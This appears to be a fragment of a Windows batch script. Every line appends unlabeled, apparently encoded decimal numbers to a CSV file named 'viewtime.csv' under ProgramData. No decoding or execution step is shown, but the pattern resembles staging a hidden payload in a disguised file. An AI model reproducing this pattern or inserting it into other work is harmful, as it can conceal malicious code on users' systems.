>> "C:\ProgramData\abc\viewtime.csv" echo(472.187;6366.800;105.815;111.814;100.0996;801.114;572.139;38.72;0763.459;203.816;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.572;45.0374;50.16;30.0;935.240;9033.372;131.892;8.376;139.8898;908.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.24;672.131;9878.951;2.827;100.772;199.6151;893.64;70.0;60.72;2774.315;
>> "C:\ProgramData\abc\viewtime.csv" echo(175.917;72.831;192.5677;38.72;43.195;376.139;9915.588;8.373;131.951;0.0158;
>> "C:\ProgramData\abc\viewtime.csv" echo(826.58;372.139;772.16;8203.373;131.951;1.826;48.4462;372.139;480.24;373.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(7862.951;2.826;38.776;139.3780;564.32;673.131;951.3;3104.826;28.476;139.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.2446;773.131;951.4;826.18;5554.376;139.588;48.776;137.2785;492.36;440.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.88;2822.556;76.837;92.636;48.3444;477.139;426.73;955.195;9748.777;137.626;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;0.3075;955.224;372.199;892.0;4727.40;0.30;195.655;80.3144;40.47;
>> "C:\ProgramData\abc\viewtime.csv" echo(644.86;357.92;9691.421;125.521;12.439;94.9598;541.113;955.60;690.21;7792.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(15.491;46.466;17.3523;671.13;435.255;363.91;0218.548;7.546;83.334;84.2102;
>> "C:\ProgramData\abc\viewtime.csv" echo(451.90;326.12;617.93;7537.757;68.721;125.617;14.2659;551.87;362.255;338.92;
>> "C:\ProgramData\abc\viewtime.csv" echo(5501.76;22.654;83.432;96.3402;42.90;40.7;532.70;8958.955;61.784;4.752;
>> "C:\ProgramData\abc\viewtime.csv" echo(42.5256;387.59;827.22;815.29;6276.514;38.819;52.955;51.1550;371.17;63.55;
>> "C:\ProgramData\abc\viewtime.csv" echo(487.24;2611.788;2.380;21.46;51.7566;493.35;492.39;490.6;1602.59;255.735;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.322;15.9674;342.70;424.88;52.80;8811.621;6.551;93.535;92.8368;539.90;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.9;955.39;1079.384;29.622;5.593;62.1953;800.24;371.17;43.39;7551.666;
>> "C:\ProgramData\abc\viewtime.csv" echo(35.795;28.398;27.7441;716.40;813.45;592.28;4788.787;21.51;40.365;255.2487;
>> "C:\ProgramData\abc\viewtime.csv" echo(651.89;427.17;538.102;0916.736;66.321;84.316;18.2015;744.93;632.103;531.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(6071.531;255.738;92.66;22.0904;354.83;532.97;35.80;8805.76;27.955;34.665;
>> "C:\ProgramData\abc\viewtime.csv" echo(24.1567;635.39;586.10;469.30;3413.786;0.511;44.792;24.3276;781.18;789.17;
>> "C:\ProgramData\abc\viewtime.csv" echo(566.45;1903.571;33.482;21.671;84.0596;413.37;618.42;469.30;1158.786;0.611;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.392;63.5536;310.80;516.1;666.34;3305.586;40.566;21.570;7.7210;388.99;
>> "C:\ProgramData\abc\viewtime.csv" echo(523.60;955.34;9589.465;24.635;39.786;10.8420;669.30;386.0;611.44;7159.592;
>> "C:\ProgramData\abc\viewtime.csv" echo(24.381;18.389;17.6736;366.12;821.255;732.80;4627.76;17.742;65.756;16.1802;
>> "C:\ProgramData\abc\viewtime.csv" echo(521.91;60.7;649.87;2313.440;255.455;84.40;7.6956;75.71;434.83;64.92;
>> "C:\ProgramData\abc\viewtime.csv" echo(4369.627;12.599;87.534;68.7438;721.71;617.6;955.32;9386.684;7.317;42.492;
>> "C:\ProgramData\abc\viewtime.csv" echo(43.8290;716.0;690.29;312.55;3596.587;62.516;4.790;84.2500;512.38;374.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(516.0;8363.484;13.714;44.583;40.7544;955.32;571.27;522.38;9571.481;56.316;
>> "C:\ProgramData\abc\viewtime.csv" echo(21.691;0.9423;57.49;587.40;955.55;5491.581;29.481;113.428;40.0247;692.28;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.37;770.17;0052.416;112.70;98.784;28.7923;589.255;655.80;60.38;5806.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.453;91.41;15.5070;423.90;762.85;617.81;4379.435;11.645;86.435;71.5402;
>> "C:\ProgramData\abc\viewtime.csv" echo(43.255;553.91;71.15;5048.412;80.738;85.519;65.3214;67.255;334.64;526.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(5842.634;75.732;95.517;81.2382;584.3;755.18;645.84;6839.320;71.417;17.548;
>> "C:\ProgramData\abc\viewtime.csv" echo(15.3137;805.64;380.66;629.22;7271.543;18.805;89.580;84.9655;36.5;754.95;
>> "C:\ProgramData\abc\viewtime.csv" echo(641.94;8875.44;70.955;36.493;1.9280;712.39;387.62;827.30;2415.589;13.542;
>> "C:\ProgramData\abc\viewtime.csv" echo(34.766;60.5341;485.30;570.35;510.38;6845.592;5.568;3.803;21.6561;311.45;
>> "C:\ProgramData\abc\viewtime.csv" echo(791.34;387.255;0844.955;204.904;204.904;204.1640;904.204;812.72;70.0;2337.676;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.576;36.732;68.1462;837.68;636.24;472.137;0004.684;36.416;72.837;76.2047;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.8;687.72;829.236;7594.348;1.40;0.572;139.0199;832.36;464.1;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(0874.372;137.568;36.656;72.0605;839.132;436.72;61.0;5087.30;72.837;68.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(48.3692;572.141;568.36;680.72;2086.839;248.351;192.885;224.4682;60.0;70.243;
>> "C:\ProgramData\abc\viewtime.csv" echo(870.72;5195.839;132.636;88.61;0.7819;40.72;837.68;536.96;5756.572;141.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(53.364;0.2953;70.72;837.68;336.64;3366.472;139.468;36.648;72.2383;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.32;376.139;8966.676;36.556;65.884;215.5614;67.0;30.72;839.84;9188.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.772;141.576;36.4595;680.232;888.0;70.0;2399.572;141.476;36.380;232.6421;
>> "C:\ProgramData\abc\viewtime.csv" echo(910.60;40.0;884.1;8908.30;0.30;72.805;192.6741;787.6;50.0;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(6093.776;36.688;72.43;200.0084;472.139;893.72;839.208;8467.372;141.576;36.480;
>> "C:\ProgramData\abc\viewtime.csv" echo(232.3641;430.63;70.0;651.192;3533.372;129.896;48.61;0.5993;50.95;895.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;0028.672;131.936;24.672;199.2111;64.36;40.0;70.0;9674.801;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.437;96.5349;70.0;40.72;837.4;5101.736;72.839;4.336;72.0766;839.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(324.72;831.196;3921.724;195.904;204.904;204.0874;904.204;904.204;904.204;1303.476;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.468;36.724;72.2774;837.84;436.16;772.137;5968.476;36.68;72.831;236.2781;
>> "C:\ProgramData\abc\viewtime.csv" echo(540.72;839.76;536.64;5626.572;139.368;36.748;255.1104;580.64;472.139;776.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(4672.656;72.837;1.672;139.5427;468.36;456.72;831.56;6356.50;117.321;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.3479;436.64;672.139;668.36;1888.748;255.680;56.572;139.5745;376.36;356.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.1;8556.672;131.896;40.895;204.1490;904.204;576.137;476.36;7676.332;68.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.336;24.2121;372.137;684.36;616.72;5411.837;76.336;8.387;72.1999;829.236;
>> "C:\ProgramData\abc\viewtime.csv" echo(876.0;30.0;0798.898;68.536;56.801;198.2491;568.36;657.36;898.68;8224.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(58.642;198.568;36.6950;559.17;898.68;436.60;8839.566;198.368;36.461;54.1467;
>> "C:\ProgramData\abc\viewtime.csv" echo(898.68;336.62;55.198;7445.468;36.663;120.898;68.5653;636.64;595.198;468.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(9487.565;33.898;68.336;66.1150;455.198;468.36;367.6;0826.898;68.436;68.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.4550;841.84;636.56;372.141;0835.576;36.556;232.912;60.9967;70.0;672.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;0716.892;0.60;0.572;139.0328;840.36;916.0;70.0;1908.572;137.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(24.472;139.8881;832.36;892.0;60.0;0876.572;139.840;36.924;0.8886;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.137;572.40;7595.372;141.484;36.756;72.5357;839.132;336.192;70.0;0843.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;72.724;72.0679;839.132;736.192;50.0;8546.70;255.680;40.372;139.0287;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;892.0;30.0;2594.672;137.465;48.839;132.5367;636.208;60.0;70.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(5428.885;4.70;0.70;65.4753;884.0;616.0;50.139;0939.908;51.901;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.0199;636.192;70.0;70.255;9917.380;48.672;139.840;36.2989;892.0;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.137;4341.665;8.839;132.636;208.1415;50.0;60.68;839.192;3185.372;139.848;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.900;0.7926;70.0;672.139;832.36;3002.892;0.30;0.572;139.5820;372.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(932.83;657.0;9227.40;72.839;132.536;192.7351;40.0;60.72;839.64;8912.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.837;68.436;72.4563;772.139;832.36;892.0;7298.40;0.839;76.636;72.6980;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.64;48.43;893.59;7227.832;36.908;0.40;0.0480;815.74;672.139;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(6231.892;0.60;0.672;139.3922;580.8;372.139;832.36;7923.892;0.60;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.9580;372.8;932.235;359.0;6324.40;72.839;132.536;192.0084;70.0;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.72;1626.78;232.934;60.40;0.0906;572.152;572.139;840.36;7909.892;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.672;3.2948;465.8;672.139;840.36;0442.892;0.30;0.672;137.7404;765.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(935.156;472.139;3812.832;36.892;0.40;0.7332;772.139;376.36;572.72;9054.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.38;184.41;0.1544;30.0;572.107;892.0;9632.472;139.840;36.892;0.2116;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;572.3;365.8;7542.772;139.908;72.839;132.6365;336.192;50.0;40.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(5112.839;72.624;72.839;132.1845;536.192;50.0;50.255;1883.780;40.672;139.840;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.2002;892.0;60.0;772.137;6563.765;64.884;1.50;0.4884;30.72;807.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(617.72;4461.839;140.636;192.50;0.5755;70.72;53.65;68.72;4344.839;208.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.832;36.5806;892.0;30.0;572.139;1153.772;24.472;139.832;36.3575;892.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;955.80;9305.440;72.839;140.336;192.1601;70.0;50.72;837.65;2447.456;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.71;0.50;0.9918;772.107;892.30;672.139;7989.840;36.892;0.50;0.7771;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.3;465.8;572.139;4007.840;36.892;0.70;0.1556;672.131;893.32;576.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(5456.892;72.839;209.572;139.3682;840.36;892.0;40.0;4019.932;115.953;255.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.4419;51.0;60.0;572.107;0822.892;36.472;139.840;36.0755;892.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.3;8116.465;8.576;139.892;72.5923;841.148;436.160;50.0;3726.70;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(140.536;192.9313;30.0;30.232;570.253;0228.955;255.899;68.536;32.8539;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;372.141;3855.368;36.380;72.839;248.3072;451.192;885.72;30.0;9587.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(243.870;184.31;0.5046;60.0;672.107;892.60;7599.772;139.476;36.472;72.3759;
>> "C:\ProgramData\abc\viewtime.csv" echo(33.200;372.139;893.72;8339.839;140.736;192.40;0.6779;60.72;837.65;68.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(4947.839;132.436;192.70;0.0863;70.72;831.192;472.185;5200.48;0.70;0.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(107.7026;901.0;472.137;768.12;6341.680;72.839;132.636;192.3146;40.0;50.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(831.192;0946.780;185.78;0.40;0.2459;472.107;901.1;772.137;6246.468;12.680;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;132.8202;736.192;40.0;70.72;6814.831;192.388;185.68;0.8772;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.107;901.2;7734.372;137.468;12.480;72.6087;839.132;336.192;50.0;5690.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.831;192.596;185.6916;68.0;40.0;472.107;7913.901;3.772;137.468;12.7146;
>> "C:\ProgramData\abc\viewtime.csv" echo(580.72;839.132;536.192;8803.30;0.70;72.831;192.0676;804.185;38.0;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3577.672;107.901;4.372;137.7953;368.12;680.72;839.132;9512.336;192.50;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.9673;831.192;812.185;38.0;5806.40;0.472;107.901;5.0201;572.137;568.12;
>> "C:\ProgramData\abc\viewtime.csv" echo(780.72;7767.839;132.436;192.70;0.6889;40.72;831.192;820.185;0486.38;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.772;107.2029;901.6;372.137;668.12;5819.680;199.368;36.732;7.3721;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.199;668.36;5048.636;0.70;0.50;235.0780;610.139;568.36;436.255;2711.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.468;36.536;139.1610;768.36;432.57;568.36;5088.436;125.393;72.839;132.8359;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.192;70.0;50.72;2655.839;80.68;72.839;132.6816;336.192;50.0;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(2410.839;72.524;72.839;132.5350;536.192;30.0;50.255;6525.380;40.472;99.376;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.8372;436.72;839.76;904.80;7140.572;137.61;72.839;132.5945;536.192;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.72;1901.839;72.38;232.844;58.6654;50.0;772.152;672.139;0327.840;36.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;0.5237;672.3;465.8;372.139;6292.840;36.892;0.70;0.7629;572.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(565.8;935.143;1581.672;139.832;36.892;0.4713;30.0;672.5;828.0;1252.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.885;8.60;0.0633;60.72;807.201;60.72;5072.837;68.712;80.672;139.2644;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;892.0;40.0;6943.772;5.836;0.30;0.6097;885.8;50.0;70.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(8798.807;201.51;72.837;68.7935;712.80;572.139;832.36;9404.892;0.30;0.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.2729;844.0;50.0;885.8;5785.60;0.50;72.807;201.5442;52.72;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(712.80;8042.572;139.832;36.892;0.8308;40.0;772.5;852.0;3218.60;0.885;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.70;0.5721;40.72;807.201;53.72;9410.837;68.412;80.572;139.0131;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.0;70.0;9778.772;5.860;0.50;0.4523;885.8;50.0;30.72;4366.807;
>> "C:\ProgramData\abc\viewtime.csv" echo(201.64;72.837;68.9588;512.80;472.139;832.36;2167.892;0.30;0.672;5.3828;
>> "C:\ProgramData\abc\viewtime.csv" echo(868.0;60.0;885.8;5116.40;0.50;72.807;201.3885;65.72;837.68;412.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(8000.472;139.832;36.892;0.3455;40.0;372.5;876.0;1487.40;0.885;8.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.9296;70.72;807.201;56.72;6220.837;68.712;80.672;139.3816;832.36;892.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;3977.472;5.884;0.60;0.1328;885.8;60.0;30.72;1896.807;201.57;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.837;68.6085;512.80;672.139;832.36;6711.892;0.60;0.472;5.8318;892.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;885.8;1289.30;0.40;72.807;201.8203;48.72;837.68;612.80;3607.899;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.636;32.39;0.9033;70.0;899.68;736.40;0702.30;0.50;0.935;10.1909;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;536.40;955.192;1132.837;68.436;40.839;68.6156;636.32;657.68;336.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(5176.825;93.772;139.832;36.3829;892.0;60.0;672.139;9050.580;8.572;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.0066;892.0;40.0;372.139;7490.572;24.672;139.832;36.8272;892.0;60.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.80;5139.340;72.699;76.436;40.9767;472.139;676.204;380.72;2736.837;1.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.832;36.2730;892.0;50.0;472.139;6406.372;8.932;17.457;0.7628;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(852.72;839.140;7755.336;192.70;0.40;72.6431;53.65;68.72;839.140;1278.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.70;0.40;72.9096;837.65;38.235;843.72;9263.839;132.636;192.30;0.0355;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.72;35.200;50.0;8554.50;185.58;0.70;0.4464;672.107;901.0;372.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(2009.668;12.780;199.768;36.4127;432.1;60.0;50.199;5480.468;36.744;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.1246;60.235;510.139;768.36;6041.744;255.892;137.368;36.2636;744.139;468.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(632.57;4408.568;36.744;125.793;72.1935;839.132;336.192;70.0;5058.30;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.78;72.4463;839.132;636.192;50.0;3116.30;72.839;72.624;72.4596;839.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.192;50.0;5618.70;255.480;40.772;99.4213;576.36;544.72;839.76;4306.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.472;137.71;72.4886;839.132;536.192;40.0;8063.40;72.839;72.58;232.6457;
>> "C:\ProgramData\abc\viewtime.csv" echo(814.56;40.0;772.152;6963.472;139.840;36.892;0.5291;30.0;472.3;565.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(2220.372;139.840;36.892;0.1903;70.0;572.137;465.8;5838.935;143.672;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.1983;892.0;50.0;772.5;8636.908;0.70;0.885;8.6282;70.0;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;3956.40;72.837;68.612;80.8139;572.139;832.36;892.0;2979.40;0.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.916;0.7356;70.0;885.8;40.0;2859.40;72.807;201.71;72.9349;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(312.80;899.68;1904.536;32.42;0.40;0.1553;899.68;536.48;40.0;4007.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.935;10.839;68.2323;736.48;955.192;837.68;3616.736;48.839;68.636;32.7599;
>> "C:\ProgramData\abc\viewtime.csv" echo(757.68;636.48;825.93;6866.772;139.832;36.892;0.7548;70.0;372.139;380.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(0125.672;139.832;36.892;0.5297;30.0;772.139;472.32;7990.772;139.832;36.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.2380;30.0;955.80;740.72;4799.499;76.736;48.772;139.1719;676.204;680.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.1;7756.372;139.832;36.892;0.4765;70.0;472.139;372.8;6594.932;183.655;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;72.9071;852.72;839.140;636.192;7532.60;0.60;72.73;65.0917;38.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.140;336.192;7762.40;0.40;72.837;65.3725;68.235;843.72;839.132;5229.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.40;0.50;139.0841;376.36;772.139;564.8;8280.743;193.839;192.468;139.0083;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.51;910.72;839.76;6739.436;72.932;9.352;0.5374;40.72;839.132;736.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(5507.50;0.30;72.839;76.8492;436.72;372.137;772.8;4489.672;129.896;176.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.6553;50.95;895.204;904.204;7500.904;204.904;204.904;204.0777;904.204;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;1816.376;137.568;36.524;72.4527;837.84;636.16;572.137;3850.776;36.38;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.831;236.6006;804.72;839.76;736.120;6811.372;139.368;36.812;255.1492;580.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.137;468.36;6931.772;72.839;76.636;72.1072;932.161;63.0;30.72;8765.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.336;48.672;131.8133;824.36;348.0;817.46;8277.884;1.30;0.70;72.4957;
>> "C:\ProgramData\abc\viewtime.csv" echo(805.192;826.1;40.0;2395.472;139.576;36.812;72.4723;43.65;78.76;839.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(4241.636;72.672;139.908;72.9878;839.76;336.112;932.45;9774.755;0.50;51.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(233.0134;817.2;40.0;672.139;0317.832;36.828;0.70;0.3424;572.139;576.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(548.72;4996.837;136.860;6.40;0.3056;772.139;832.36;828.0;4784.60;0.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.776;36.0525;572.72;837.136;844.6;2228.60;0.572;139.832;36.2719;828.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;472.139;1059.776;36.448;139.573;64.7026;837.136;852.6;70.0;2545.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.832;36.828;0.5587;60.0;465.184;60.2;0385.40;0.472;139.384;36.6349;
>> "C:\ProgramData\abc\viewtime.csv" echo(548.72;839.200;932.157;8662.650;0.30;72.839;68.5164;536.48;472.139;828.152;
>> "C:\ProgramData\abc\viewtime.csv" echo(6158.70;0.50;72.837;68.6597;736.80;472.139;832.36;1317.828;0.40;0.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.7321;576.36;780.72;837.136;1468.868;6.70;0.672;131.3895;824.36;680.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(816.51;5780.772;139.832;36.828;0.8740;70.0;672.5;70.2;3041.30;0.765;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.828;0.1195;40.0;372.139;684.36;6803.580;72.839;200.932;79.8188;750.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.72;839.132;0946.736;128.60;0.70;199.7467;828.176;36.0;30.1;2077.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;72.839;68.0837;536.48;472.131;892.72;4195.772;137.768;36.656;72.5649;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;436.48;772.131;0062.892;88.772;137.668;36.0199;664.72;839.68;736.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(9399.772;131.820;8.70;116.1815;792.72;839.68;636.56;5176.615;183.50;72.661;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.3758;42.0;50.115;576.72;9202.839;68.536;56.615;183.9066;30.72;839.140;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.128;6321.60;0.60;72.829;193.2619;828.2;70.0;468.139;2805.892;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.536;56.0178;572.139;480.8;932.221;8205.749;0.40;72.839;68.8041;636.56;
>> "C:\ProgramData\abc\viewtime.csv" echo(315.183;50.51;4158.910;185.72;0.70;0.5975;572.247;941.51;901.72;9245.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(148.736;128.30;0.3146;40.102;837.140;566.128;7381.52;0.60;72.839;68.2294;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.64;472.131;820.8;2311.60;116.692;72.839;68.1841;536.64;615.183;30.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(9967.661;8.72;0.70;115.8721;476.72;839.68;336.64;2199.715;183.30;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(140.0697;336.128;40.0;50.72;1805.829;193.836;4.50;0.6804;468.139;892.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;4472.736;64.672;139.680;8.3675;932.117;749.0;30.72;1228.839;68.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.415;183.0028;40.51;910.185;72.0;6998.40;0.772;247.941;51.4789;901.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.148;336.128;7919.70;0.60;102.837;140.0507;366.136;34.0;30.72;0871.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.736;128.40;0.4424;30.72;839.144;884.6;0192.50;0.572;139.476;36.8837;
>> "C:\ProgramData\abc\viewtime.csv" echo(348.232;900.0;30.0;6317.372;139.840;36.828;0.6999;60.0;837.129;880.6;
>> "C:\ProgramData\abc\viewtime.csv" echo(2068.40;0.884;1.40;0.7026;40.72;805.192;872.1;9861.50;0.472;139.776;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.0393;812.72;33.65;38.72;7673.839;140.336;128.70;0.4096;40.68;839.129;
>> "C:\ProgramData\abc\viewtime.csv" echo(880.6;9875.30;0.772;139.908;72.2387;839.76;336.112;932.41;1771.753;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.51;0.3296;30.0;372.105;892.203;4969.61;0.40;72.839;76.5735;636.112;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.3;665.8;1421.572;139.840;36.828;0.3515;50.0;839.137;852.6;1365.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.837;76.336;40.3343;472.139;840.36;828.0;9333.60;0.472;139.837;144.7291;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.0;60.72;837.76;6214.736;32.772;139.840;36.4564;828.0;60.0;676.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(9832.837;168.66;0.50;72.1350;839.140;336.128;40.0;1260.40;76.839;129.860;
>> "C:\ProgramData\abc\viewtime.csv" echo(6.4839;70.0;572.139;908.72;9576.839;76.636;112.932;195.3538;752.0;60.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;4842.436;72.672;139.668;36.5818;812.255;480.96;884.1;9477.30;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.831;196.9563;804.195;904.204;904.204;2995.904;204.904;204.904;204.1260;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.137;684.36;1051.616;72.837;76.636;8.2216;672.131;936.56;472.139;8797.768;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.572;72.837;68.8123;436.32;572.131;824.36;3726.532;0.816;8.372;131.3224;
>> "C:\ProgramData\abc\viewtime.csv" echo(824.36;564.0;817.7;8718.651;192.933;163.50;0.1780;50.199;44.36;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7822.70;0.935;8.839;4.9241;336.255;892.137;54.36;2525.831;60.536;32.615;
>> "C:\ProgramData\abc\viewtime.csv" echo(141.6587;834.0;50.0;372.99;2123.64;36.772;107.892;16.5069;672.139;576.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(732.72;3539.43;200.672;139.893;72.6567;837.68;736.8;672.139;9744.768;36.58;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.839;76.4680;336.8;372.57;78.117;2809.72;235.897;72.839;68.0331;736.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.139;70.72;3610.837;68.436;16.935;13.2509;372.139;368.36;616.72;8665.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.572;137.668;36.5942;316.72;839.68;636.8;2156.572;57.468;36.316;116.2153;
